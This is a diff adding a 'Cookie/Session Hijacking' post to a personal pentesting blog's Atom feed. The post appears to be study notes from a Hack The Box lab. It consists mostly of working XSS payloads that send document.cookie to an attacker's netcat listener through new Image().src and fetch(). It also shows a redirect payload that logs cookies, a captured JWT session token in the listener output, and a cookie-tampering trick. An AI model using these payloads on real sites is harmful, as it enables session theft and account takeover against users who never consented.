@@ -4,13 +4,94 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-02-07T19:15:13+08:00</updated>
+ <updated>2022-02-12T18:27:58+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Cookie/Session Hijacking</title>
+   <link href="https://mvineza.github.io/spindel/2022/02/12/cookie-session-hijacking"/>
+   <updated>2022-02-12T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/02/12/Cookie_Session_Hijacking</id>
+   <content type="html">&lt;h2 id=&quot;intercepting-via-netcat&quot;&gt;Intercepting via netcat&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Open netcat listener on attacker machine&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Submit this XSS script on the form&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;new Image().src=&quot;http://10.11.40.33:4444/bogus.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Cookie%20(Session)%20Hijacking/BC7E0478-D577-462B-BCF7-A9A0D0590D87.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You will be able to intercept the cookie&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  marketplace nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 4444        
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.11.40.33] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.11.40.33] 57706
+GET /bogus.php?output&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZGVtbyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjI4MTU5MzYzfQ.Nka6_SPBNEE1B3PmDWg4p7c3cG3BF4zqhTMCgGa6bJM HTTP/1.1
+Host: 10.11.40.33:4444
+Connection: keep-alive
+User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Chrome/91.0.4472.114 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
+Referer: http://10.10.177.20/
+Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
+Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You can use this method to grab an admin cookie&lt;/li&gt;
+  &lt;li&gt;An alternative is using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fetch&lt;/code&gt; and redirecting it to your HTTP listener&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# using fetch&lt;/span&gt;
+&amp;lt;script&amp;gt;fetch&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://10.11.40.33:4444/&quot;&lt;/span&gt;+document.cookie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;NOTE: There mght be delay in seeing the output so you might want to be patient&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;redirect-to-another-page&quot;&gt;Redirect to another page&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Insert this payload to comment section&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 10.10.39.208 - victim ip&lt;/span&gt;
+&amp;lt;script&amp;gt;document.location&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.39.208/log/'&lt;/span&gt;+document.cookie&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Refresh the page&lt;/li&gt;
+  &lt;li&gt;Go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/logs&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;Cookie%20(Session)%20Hijacking/79797591-B0CB-47DA-A97A-26504675CB4D.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;other-payloads&quot;&gt;Other payloads&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# sent by server -&amp;gt; cookie: denied&lt;/span&gt;
+cookie: granted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB RedCross&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies&quot;&gt;Cookies Hacking - HackTricks&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Nibble</title>
